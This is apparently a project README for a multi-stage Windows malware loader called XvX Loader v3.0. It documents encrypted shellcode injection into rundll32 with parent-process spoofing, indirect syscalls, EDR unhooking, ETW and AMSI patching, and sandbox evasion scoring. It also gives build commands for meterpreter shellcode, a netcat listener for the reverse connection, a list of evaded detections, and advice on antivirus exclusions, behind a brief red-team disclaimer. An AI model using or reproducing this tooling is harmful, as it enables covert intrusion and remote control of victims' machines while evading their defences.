# XvX Loader v3.0

Multi-stage Windows loader written in C. Takes a [donut](https://github.com/TheWover/donut) shellcode, AES-256-CBC decrypts it at runtime, and injects it via early-bird APC into a `rundll32.exe` spawned under `explorer.exe`. All sensitive NT operations go through indirect syscalls — no direct WinAPI calls on the hot path.

---

## Architecture

```
payload.exe
    └── donut → shellcode.bin
        └── encrypt_payload.exe → shellcode_aes.bin + key_iv.txt (AES-256-CBC, random key/IV)
            └── build.ps1 → embeds key+IV+shellcode into loader_v3.c → Loader.exe
```

**Execution flow on target:**

```
main()
 ├─ SetupEnvironment()       — FreeConsole, decoy API calls
 ├─ AntiSandboxDelay(120s)   — Sleep + time-acceleration check (QPC)
 ├─ RunEvasionChecks()       — composite sandbox scoring, exit if score ≥ 50
 ├─ UnhookEDR()              — NTDLL .text restored from fresh disk copy
 ├─ BypassTelemetry()        — ETW + AMSI patched
 └─ DecryptAndInject()       — AES-256-CBC decrypt → APC inject → rundll32 under explorer
```

---

## Modules

| Module | Technique |
|---|---|
| `syscalls.c` | Fresh NTDLL load, ROR13 hash-based function resolution, SSN extraction, 12 NT wrappers |
| `dosyscall.S` | x64 indirect syscall stubs — `call *gadget` not inline `syscall` instruction |
| `injection.c` | Early-bird APC: CREATE_SUSPENDED → NtAllocate → NtWrite → NtQueueApc → NtResume |
| `unhooking.c` | NTDLL .text section overwrite from disk (PointerToRawData vs VirtualAddress) |
| `etw_bypass.c` | Patch `EtwEventWrite` + `EtwEventWriteEx` to `ret` |
| `amsi_bypass.c` | Patch `AmsiScanBuffer` in `amsi.dll` |
| `sandbox_evasion.c` | Scoring: VM registry/filesystem, PEB debugger, NtQueryInformationProcess(ProcessDebugPort), CPU/RAM/disk, uptime, user idle, process count |
| `ppid_spoofing.c` | `UpdateProcThreadAttribute` PROC_THREAD_ATTRIBUTE_PARENT_PROCESS |
| `obfuscation.c` | XOR string obfuscation (key 0x42), adaptive sleep, junk API calls |
| `crypto.c` | AES-256-CBC via BCrypt (CNG) |

Sandbox scoring (exits at ≥ 50 or debugger):

| Check | Score |
|---|---|
| VM detected (registry / filesystem) | +30 |
| Debugger (PEB + NtQueryInformationProcess) | +40 |
| CPU < 2 / RAM < 4 GB / Disk < 80 GB | +20 |
| Uptime < 10 min | +15 |
| Process count < 50 | +15 |
| No user activity | +10 |

---

## Build

**Requirements:** MinGW-w64 (`x86_64-w64-mingw32-gcc`), PowerShell 7+, `donut.exe`

**Step 1 — Generate shellcode**

```sh
# Compile payload
x86_64-w64-mingw32-gcc payload.c -o payload.exe -lws2_32 -mwindows

# Convert to PIC shellcode
donut.exe -i payload.exe -o payload\meterpreter.bin
```

**Step 2 — Build**

```powershell
# Production (stripped, -O2, no console)
.\build.ps1

# Debug (verbose, console, no sandbox delay)
.\build.ps1 -Mode debug

# Custom output name
.\build.ps1 -Mode prod -OutputName implant.exe
```

Output: `output\Loader.exe`

**Rebuild encrypt_payload.exe** (if `crypto.c` was modified):

```sh
gcc tools\encrypt_payload.c modules\crypto.c -o tools\encrypt_payload.exe -lAdvapi32
```

---

## Usage

```sh
# Listener
nc -lvnp 4444

# Run Loader.exe on target
# Waits 120s → sandbox checks → NTDLL unhook → ETW/AMSI → inject rundll32
```

Debug build skips sandbox scoring and prints stage output to console — use for VM testing.

---

## Configuration

Top of `loader_v3.c`:

```c
#define DEFAULT_TARGET_PROCESS  "rundll32.exe"
#define DEFAULT_PARENT_PROCESS  "explorer.exe"
#define DEFAULT_DELAY_SECONDS   30        // second sleep after primary delay
// AntiSandboxDelay(120) in main() — primary delay
```

---

## Dependencies

- MinGW-w64, Windows SDK headers
- `advapi32`, `ntdll`, `user32`, `ws2_32`
- [donut v1](https://github.com/TheWover/donut) — PE → shellcode conversion
- No external C libraries

## Detection

**What's mitigated:**
- Syscall strings obfuscated (SysAllocMem instead of NtAllocateVirtualMemory)
- No suspicious imports (everything via syscalls)
- ETW patched (no telemetry logs)
- EDR hooks bypassed

**What's still visible:**
- High entropy (AES-256 = random data)
- RWX memory allocation (required for shellcode)
- Injection behavior (detectable by advanced EDR)
- Orphan rundll32.exe process (no parameters)

## Known issues

If `dosyscall.o` missing after cleanup:
```powershell
cd modules
gcc -c dosyscall.S -o dosyscall.o
```

If loader gets killed by Kaspersky/Defender during testing:
- Add folder exclusion in AV
- Compile with `-DPRODUCTION` (disables printf that can trigger)

## Contact

28Zaakypro@proton.me

**Disclaimer:** Authorized red team / pentest only. Illegal use = your responsibility.
